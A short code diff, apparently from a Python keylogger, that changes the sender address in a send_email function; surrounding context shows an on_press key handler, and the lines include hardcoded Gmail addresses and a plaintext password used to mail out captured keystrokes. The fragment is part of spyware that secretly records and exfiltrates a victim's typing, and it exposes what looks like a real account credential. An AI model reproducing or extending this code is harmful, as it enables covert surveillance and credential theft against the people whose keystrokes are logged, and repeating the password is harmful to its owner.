@@ -16,7 +16,7 @@ def on_press(key):
 
 # Define function to send email
 def send_email():
-    fromaddr = 'crufty01@gmail.com'
+    fromaddr = 'eliasmateogamepass@gmail.com'
     toaddr = 'crufty01@gmail.com'
     password = '131613elias131613E..E..'
 
